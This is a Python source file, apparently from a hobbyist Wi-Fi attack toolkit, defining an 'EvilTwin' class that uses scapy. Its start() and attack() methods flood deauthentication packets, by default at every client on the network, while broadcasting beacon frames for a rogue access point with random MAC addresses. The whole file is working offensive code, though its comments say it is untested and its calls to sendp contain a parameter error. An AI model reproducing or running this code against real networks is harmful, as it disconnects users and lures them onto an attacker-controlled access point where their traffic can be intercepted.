from time import sleep
from multiprocessing import Process

from scapy.sendrecv import sendp

from objects.accesspoint import AccessPoint
from objects.interfaces import Interface, get_interface_by_name
from scapy.volatile import RandMAC

class EvilTwin(AccessPoint):
    
    def __init__(
        self,
        ssid: str,
        bssid: str,
        interface: Interface,
    ) -> None:
        super().__init__(ssid=ssid, interface=interface, bssid=bssid)
    
    def start(
        self,
        target_mac: str = 'ff:ff:ff:ff:ff:ff',
        interval: float = .1,
        count: int = None,
        verbose: bool = True,
    ) -> None:

        random_bssid = str(RandMAC())
        
        dp = Process(target=self.deauth, args=(
            self._interface.get_name(),
            target_mac,
            interval,
            count,
            verbose,
        ))
        ap = Process(target=self.appear, args=(
            interval,
            random_bssid,
        ))

        try:
            ap.start()
            dp.start()

        except KeyboardInterrupt:
            ap.kill()
            dp.kill()
        
    def attack(
        self,
        target_mac: str = 'ff:ff:ff:ff:ff:ff',
        interval: float = .1,
        count: int = None,
        verbose: bool = True,
    ) -> None:

        # check if start() method works beacause i changed the interface to interface.get_name()
        # test if attack() method works

        deauth_packet = self.craft_deauth_packet(target_mac=target_mac)
        beacon_frame = self.craft_beacon_frame(bssid=str(RandMAC()))

        while not count or count > 0:
            sendp(
                x = deauth_packet,
                interface = self._interface.get_name(),
                verbose = verbose,
            )
            sendp(
                x = beacon_frame,
                interface = self._interface.get_name(),
                verbose = verbose,
            )
            sleep(interval)